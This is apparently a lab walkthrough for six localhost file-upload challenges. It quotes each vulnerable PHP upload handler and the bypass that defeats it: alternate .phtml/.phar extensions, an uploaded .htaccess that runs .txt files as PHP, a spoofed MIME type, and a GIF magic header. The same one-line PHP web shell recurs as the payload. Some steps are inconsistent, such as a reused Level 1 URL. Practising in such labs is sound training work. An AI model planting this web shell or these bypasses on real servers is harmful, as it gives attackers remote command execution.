  [LEVEL 1]-TARGET: http://localhost:12001

    - Always is easiest level:

        <?php
            session_start(); 
            $dir = 'upload/' . session_id();
            if ( !file_exists($dir) )
                mkdir($dir); 
        // Create new path for directory with new session id in website, if it doesn't exist directory, it will create a new one. 
        if(isset($_GET["debug"])) die(highlight_file(__FILE__));
       
            if(isset($_FILES["file"]))
                {
                $error = '';
                $success = '';
                try {
                    $file = $dir . "/" . $_FILES["file"]["name"];
                    move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        // when the file is sent, it will be stored in /tmp and move to the /var/www/html/upload/{session_id}/{filename}
                    
                    $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
                    $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>'; 
                } catch(Exception $e) {
                    $error = $e->getMessage();}}
        ?>

    - In docker-php.conf file, we can see there are some extensions such as ".phtml", ".php" and ".phar" can be executed like PHP file

            <FilesMatch ".+\.ph(ar|p|tml)$">
                SetHandler application/x-httpd-php
            </FilesMatch>
            DirectoryIndex disabled
            DirectoryIndex index.php index.html      
        // This line will tell you that it will automatically give you the index.php file
            <LocationMatch ^/upload/$> 
                Order deny,allow
                Deny from all
            </LocationMatch>
        // But we can't access /upload from the outside because it has denied all.

    - You can use this payload of php to RCE this level(you can use GET) and i will pull it in hackerlord.php file:

        <?php system($_REQUEST["cmd"]); ?> 
        
    - after you upload the file will be located in /var/www/html/upload/23512a7274ag5124b3e1244b0fsf12a2g3/hackerlord.php     

    - access this path then you can RCE this level: http://localhost:12001/23512a7274ag5124b3e1244b0fsf12a2g3/hackerlord.php?cmd=whoami => www-data


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


      [LEVEL 2]-TARGET: http://localhost:12002

    - Like the previous level:
        session_start();
        if (!isset($_SESSION['dir'])) 
        { 
            $_SESSION['dir'] = 'upload/' . session_id();
        }  
        $dir = $_SESSION['dir'];
        if ( !file_exists($dir) )
            mkdir($dir);
        ... 
        if(isset($_FILES["file"])) {
            $error = '';
            $success = '';
            try {
                $filename = $_FILES["file"]["name"]; 
                $extension = explode(".", $filename)[1]; 
                    if ($extension === "php") {
                    die("Hack detected");         // If the file's extension is php, it will print "Hack detected" and end program.
               }
                $file = $dir . "/" . $filename;
                move_uploaded_file($_FILES["file"]["tmp_name"], $file);
        ...
            }}
    
    - Do you remember the previous level, in docker file, there are some extensions such as ".phtml", ".php" and ".phar" that can be executed like PHP file.
        => change the extension from "php" to ".phtml" or ".phar" and upload file.

      BOOM: http://localhost:12001/23512a7274ag5124b3e1244b0fsf12a2g3/hackerlord.php?cmd=whoami => www-data    => RCE


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      [LEVEL 3]-TARGET: http://localhost:12003

    - This level will same as the previous level:

        try {
            $filename = $_FILES["file"]["name"];
            $extension = end(explode(".", $filename));
            if ($extension === "php") {
                die("Hack detected");
            }
        ...
        }
        
    - The end() function means that there will only take the extension like "php" or "phtml", so you can cahnge "php" to "phtml" or "phar" to RCE 

 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

        [LEVEL 4]-TARGET: http://localhost:12004

    - Pay attention to the index.php file:
            ...
            try {
                $filename = $_FILES["file"]["name"];
                $extension = end(explode(".", $filename));
                if (in_array($extension, ["php", "phtml", "phar"])) {   // can't use "phtml" or "phar" extentions more...
                    die("Hack detected");
                }
            ...
            }

    - But there is a new file called apache2.conf:

        ...
        <Directory />
                Options FollowSymLinks
                AllowOverride None
                Require all denied
        </Directory>

        <Directory /usr/share>
                AllowOverride None
                Require all granted
        </Directory>

        <Directory /var/www/>
                Options Indexes FollowSymLinks
                AllowOverride All

           // The `AllowOverride` directive determines what types of directives are allowed in `.htaccess` files. 

                Require all granted
        </Directory>

        AccessFileName .htaccess
        ...

        => I need to upload and .htaccess file to config some rules:

            $ cat .htaccess 

                <FilesMatch ".+\.txt$">
                    SetHandler application/x-httpd-php 
                </FilesMatch>

            => Now, I can execute .txt like a PHP file

          - After you successful upload .htaccess file, you upload php file with this payload : <?php system($_REQUEST["cmd"]); ?> 

          => Successful upload php file. => RCE time

    
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

        [LEVEL 5]-TARGET: http://localhost:12005

    - index.php tells us that this lab only accepts image or gif file. Focus on these lines:

        ...
        try {
            $mime_type = $_FILES["file"]["type"];
            if (!in_array($mime_type, ["image/jpeg", "image/png", "image/gif"])) {
                die("Hack detected");
            }    
        ...
        }
              // Forcus on these MIME types, if the MIME types are "image/jpeg", "image/png", "image/gif", it will work. => let's change it.

        - In this case, we can use Burp Suite to solve:

            ...
            Content-Type: image/gif

            <?php system($_REQUEST["cmd"]); ?>

        => Forward => Successful => RCE 

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

        [LEVEL 6]-TARGET: http://localhost:12006

    - Look at the index.php:
        ...
        try {
            $finfo = finfo_open(FILEINFO_MIME_TYPE);
    // `FILEINFO_MIME_TYPE` option in PHP is used to specify that the fileinfo resource should return the MIME type of the file being inspected.

            $mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
            
    // [?] The `Magic File Database` contains a collection of file type signatures and rules that are used to identify the type of a file based on its contents.
                
            $whitelist = array("image/jpeg", "image/png", "image/gif");
            if (!in_array($mime_type, $whitelist, TRUE)) {
                die("Hack detected");
            }
        ...
        }

    => To solve this challenge, we'll use magic header
            
            ...
            Content-Type: application/x-php
            GIF87a
            <?php system($_REQUEST["cmd"]); ?>
    
    => Forward => successful uplaod file => RCE
